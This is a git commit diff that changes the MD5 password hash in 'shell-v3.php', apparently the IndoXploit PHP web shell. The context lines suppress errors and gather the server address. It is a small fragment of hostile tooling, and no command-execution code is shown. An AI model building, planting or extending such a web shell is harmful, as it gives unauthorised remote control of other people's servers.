8050138614465b302ef252fe876154aad64884e6
tampansky <42198256+tampansky@users.noreply.github.com>
2019-09-12 20:39:00 +0700

    Update shell-v3.php

--- shell-v3.php
+++ shell-v3.php
@@ -10,7 +10,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$password = "7b4939a8af28c814f0c757bb10f40d3d"; # md5: IndoXploit
+$password = "900bc885d7553375aec470198a9514f3"; # md5: IndoXploit
 
 $SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
 $FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
